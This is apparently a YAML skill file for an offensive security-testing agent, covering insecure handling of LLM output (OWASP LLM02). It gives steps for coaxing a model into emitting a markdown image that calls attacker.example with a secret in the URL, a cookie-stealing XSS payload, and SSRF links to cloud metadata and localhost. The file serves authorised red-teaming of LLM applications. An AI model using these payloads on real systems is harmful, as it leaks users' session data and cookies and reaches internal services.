id: llm-insecure-output-handling
name: "LLM Insecure Output Handling"
description: "Exploit clients that render/execute LLM output without sanitizing it: markdown-image exfiltration, HTML/JS injection (XSS via the model), and SSRF via auto-fetched URLs."
version: 1
applicable_roles:
  - attack
tags:
  - llm
  - owasp-llm02
  - output-handling
  - xss
  - exfiltration
  - ssrf
triggers:
  - "render(?:ed|s)?.*(?:markdown|html|output)"
  - "!\\[[^\\]]*\\]\\(https?://"
  - "\\bXSS\\b"
  - "innerHTML"
  - "dangerouslySetInnerHTML"
  - "<img[^>]+onerror"
  - "link\\s*(?:preview|unfurl)"
  - "output.*(?:render|execut|eval)"
estimated_tokens: 600
content: |
  ## LLM Insecure Output Handling (OWASP LLM02)

  The bug is DOWNSTREAM of the model: the app renders or executes model
  output without sanitizing it. The model is the injection vector into the
  next system.

  ### Step 1: Map the output sinks
  - Is the reply rendered as HTML/markdown in a browser? Passed to a
    shell/eval? Concatenated into SQL or an HTTP request? Fed to another
    tool? Each sink is a separate target with its own dangerous payload.

  ### Step 2: Coax dangerous output
  - **Markdown image exfiltration (zero-click):** get the model to emit
    `![x](https://attacker.example/log?d=SECRET)`. A markdown renderer
    silently GETs the URL, leaking whatever you smuggled into the query
    string (session data, prior message content).
  - **HTML/JS injection (XSS via the model):** `<img src=x
    onerror=alert(document.cookie)>` or `<script>...`. If the UI renders
    unescaped, you have stored/reflected XSS through the model.
  - **SSRF via output:** induce a link to `http://169.254.169.254/...` or
    `http://localhost/...` that a link-unfurler or browser tool auto-fetches.
  - **Code / SQL:** if output is eval'd or used to build a query, break out.

  ### Step 3: Confirm at the sink
  - Confirm the DOWNSTREAM effect, not just the model text: dialog fires,
    callback hits your listener, internal URL fetched. Text in the reply is
    not yet a finding — rendering/execution is.

  ### Step 4: Save the finding
  - Record the prompt that produced the dangerous output, the
    rendered/executed sink, and the observed effect (callback log, dialog,
    fetched URL). Map to category `output-manipulation`.
